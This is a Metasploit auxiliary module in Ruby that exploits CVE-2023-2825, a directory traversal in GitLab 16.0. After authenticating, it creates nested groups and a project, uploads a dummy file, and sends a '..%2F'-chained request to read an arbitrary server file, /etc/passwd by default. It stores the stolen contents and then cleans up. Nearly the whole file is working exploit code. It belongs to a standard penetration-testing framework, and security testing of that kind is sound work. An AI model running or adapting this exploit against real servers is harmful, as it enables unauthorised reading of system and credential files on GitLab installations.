##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::HTTP::Gitlab
  include Msf::Auxiliary::Report
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'GitLab Authenticated File Read',
        'Description' => %q{
          GitLab version 16.0 contains a directory traversal for arbitrary file read
          as the `gitlab-www` user. This module requires authentication for exploitation.
          In order to use this module, a user must be able to create a project and groups.
          When exploiting this vulnerability, there is a direct correlation between the traversal
          depth, and the depth of groups the vulnerable project is in. The minimum for this seems
          to be 5, but up to 11 have also been observed. An example of this, is if the directory
          traversal needs a depth of 11, a group
          and 10 nested child groups, each a sub of the previous, will be created (adding up to 11).
          Visually this looks like:
          Group1->sub1->sub2->sub3->sub4->sub5->sub6->sub7->sub8->sub9->sub10.
          If the depth was 5, a group and 4 nested child groups would be created.
          With all these requirements satisfied a dummy file is uploaded, and the full
          traversal is then executed. Cleanup is performed by deleting the first group which
          cascades to deleting all other objects created.
        },
        'Author' => [
          'h00die', # MSF module
          'pwnie', # Discovery on HackerOne
          'Vitellozzo' # PoC on Github
        ],
        'References' => [
          ['URL', 'https://about.gitlab.com/releases/2023/05/23/critical-security-release-gitlab-16-0-1-released/'],
          ['URL', 'https://github.com/Occamsec/CVE-2023-2825'],
          ['URL', 'https://labs.watchtowr.com/gitlab-arbitrary-file-read-gitlab-cve-2023-2825-analysis/'],
          ['CVE', '2023-2825']
        ],
        'DisclosureDate' => '2023-05-23',
        'License' => MSF_LICENSE,
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [],
          'SideEffects' => [IOC_IN_LOGS]
        }
      )
    )

    register_options(
      [
        OptString.new('USERNAME', [true, 'The username to authenticate as', nil]),
        OptString.new('PASSWORD', [true, 'The password for the specified username', nil]),
        OptInt.new('DEPTH', [ true, 'Depth for Path Traversal (also groups creation)', 11]),
        OptString.new('FILE', [true, 'File to read', '/etc/passwd'])
      ]
    )
    deregister_options('GIT_URI')
  end

  def get_csrf(body)
    if body.empty?
      fail_with(Failure::UnexpectedReply, "HTML response had an empty body, couldn't find CSRF, unable to continue")
    end

    body =~ /"csrf-token" content="([^"]+)"/

    if ::Regexp.last_match(1).nil?
      fail_with(Failure::UnexpectedReply, 'CSRF token not found in response, unable to continue')
    end
    ::Regexp.last_match(1)
  end

  def check
    # check method almost entirely borrowed from gitlab_github_import_rce_cve_2022_2992
    @cookie = gitlab_sign_in(datastore['USERNAME'], datastore['PASSWORD'])

    raise Msf::Exploit::Remote::HTTP::Gitlab::Error::AuthenticationError if @cookie.nil?

    vprint_status('Trying to get the GitLab version')

    version = Rex::Version.new(gitlab_version)

    if version != Rex::Version.new('16.0.0')
      return CheckCode::Safe("Detected GitLab version #{version} which is not vulnerable")
    end

    report_vuln(
      host: rhost,
      name: name,
      refs: references,
      info: [version]
    )

    return Exploit::CheckCode::Appears("Detected GitLab version #{version} which is vulnerable.")
  rescue Msf::Exploit::Remote::HTTP::Gitlab::Error::AuthenticationError
    return Exploit::CheckCode::Detected('Could not detect the version because authentication failed.')
  rescue Msf::Exploit::Remote::HTTP::Gitlab::Error::ClientError => e
    return Exploit::CheckCode::Unknown("#{e.class} - #{e.message}")
  end

  def run
    if datastore['DEPTH'] < 5
      print_bad('A DEPTH of < 5 is unlikely to succeed as almost all observed installs require 5-11 depth.')
    end

    begin
      @cookie = gitlab_sign_in(datastore['USERNAME'], datastore['PASSWORD']) if @cookie.nil?
    rescue Msf::Exploit::Remote::HTTP::Gitlab::Error::AuthenticationError
      fail_with(Failure::NoAccess, 'Unable to authenticate, check credentials')
    end

    fail_with(Failure::NoAccess, 'Unable to retrieve cookie') if @cookie.nil?

    # get our csrf token
    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path)
    })
    fail_with(Failure::Unreachable, "#{peer} - Could not connect to web service - no response") if res.nil?
    fail_with(Failure::UnexpectedReply, "#{peer} - Unexpected response code (#{res.code})") unless res.code == 200
    csrf_token = get_csrf(res.body)
    vprint_good("CSRF Token: #{csrf_token}")

    # create nested groups to the appropriate depth
    print_status("Creating #{datastore['DEPTH']} groups")
    parent_id = ''
    first_group = ''
    (1..datastore['DEPTH']).each do |_|
      name = Rex::Text.rand_text_alphanumeric(8, 10)
      if first_group.empty?
        first_group = name
        vprint_status("Creating group: #{name}")
      else
        vprint_status("Creating child group: #{name} with parent id: #{parent_id}")
      end
      # a success will give a 302 and direct us to /<group_name>
      res = send_request_cgi!({
        'uri' => normalize_uri(target_uri.path, 'groups'),
        'method' => 'POST',
        'vars_post' => {
          'group[parent_id]' => parent_id,
          'group[name]' => name,
          'group[path]' => name,
          'group[visibility_level]' => 20,
          'user[role]' => 'software_developer',
          'group[jobs_to_be_done]' => '',
          'authenticity_token' => csrf_token
        }
      })
      fail_with(Failure::Unreachable, "#{peer} - Could not connect to web service - no response") if res.nil?
      fail_with(Failure::UnexpectedReply, "#{peer} - Unexpected response code (#{res.code})") unless res.code == 200
      csrf_token = get_csrf(res.body)
      vprint_good("CSRF Token: #{csrf_token}")

      # grab our parent group ID for nesting
      res.body =~ /data-clipboard-text="([^"]+)" type="button" title="Copy group ID"/
      parent_id = ::Regexp.last_match(1)
      fail_with(Failure::UnexpectedReply, "#{peer} - Cannot retrieve the parent ID from the HTML response") unless parent_id
    end

    # create a new project

    project_name = Rex::Text.rand_text_alphanumeric(8, 10)
    print_status("Creating project #{project_name}")
    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'projects'),
      'method' => 'POST',
      'vars_post' => {
        'project[ci_cd_only]' => 'false',
        'project[name]' => project_name,
        'project[selected_namespace_id]' => parent_id,
        'project[namespace_id]' => parent_id,
        'project[path]' => project_name,
        'project[visibility_level]' => 20,
        'project[initialize_with_readme]' => 1, # The POC is missing a ] here, fingerprintable?
        'authenticity_token' => csrf_token
      }
    })
    fail_with(Failure::Unreachable, "#{peer} - Could not connect to web service - no response") if res.nil?
    fail_with(Failure::UnexpectedReply, "#{peer} - Unexpected response code (#{res.code})") unless res.code == 302

    project_id = URI(res.headers['Location']).path

    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, project_id)
    })
    csrf_token = get_csrf(res.body)

    # upload a dummy file
    print_status('Creating a dummy file in project')
    file_name = Rex::Text.rand_text_alphanumeric(8, 10)
    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, project_id, 'uploads'),
      'method' => 'POST',
      'headers' => {
        'X-CSRF-Token' => csrf_token,
        'Accept' => '*/*' # required or you get a 404
      },
      'vars_form_data' => [
        {
          'name' => 'file',
          'filename' => file_name,
          'data' => Rex::Text.rand_text_alphanumeric(4, 25)
        }
      ]
    })
    fail_with(Failure::Unreachable, "#{peer} - Could not connect to web service - no response") if res.nil?
    fail_with(Failure::UnexpectedReply, "#{peer} - Unexpected response code (#{res.code})") unless res.code == 200
    res = res.get_json_document
    file_url = res.dig('link', 'url')
    if file_url.nil?
      fail_with(Failure::UnexpectedReply, "#{peer} - Unable to determine file upload URL, possible permissions issue")
    end
    # remove our file name
    file_url = file_url.gsub("/#{file_name}", '')

    # finally, read our file
    print_status('Executing dir traversal')
    target_file = datastore['FILE']
    target_file = target_file.gsub('/', '%2F')
    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, project_id, file_url, '..%2F' * datastore['DEPTH'] + "..#{target_file}"),
      'headers' => {
        'Accept' => '*/*' # required or you get a 404
      }
    })
    fail_with(Failure::Unreachable, "#{peer} - Could not connect to web service - no response") if res.nil?
    if res.code == 500
      print_error("Unable to read file (permissions, or file doesn't exist)")
    elsif res.code != 200
      print_error("#{peer} - Unexpected response code (#{res.code})") # don't fail_with so we can cleanup
    end

    if res.body.empty?
      print_error('Response has 0 size.')
    elsif res.code == 200
      print_good(res.body)
      loot_path = store_loot('GitLab file', 'text/plain', datastore['RHOST'], res.body, datastore['FILE'])
      print_good("#{datastore['FILE']} saved to #{loot_path}")
    else
      print_error('Bad response, initiating cleanup')
    end

    # deleting the first group will delete the sub-groups and project
    print_status("Deleting group #{first_group}")
    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, first_group),
      'method' => 'POST',
      'vars_post' => {
        'authenticity_token' => csrf_token,
        '_method' => 'delete'
      }
    })
    fail_with(Failure::Unreachable, "#{peer} - Could not connect to web service - no response") if res.nil?
    fail_with(Failure::UnexpectedReply, "#{peer} - Unexpected response code (#{res.code})") unless res.code == 302
  end
end
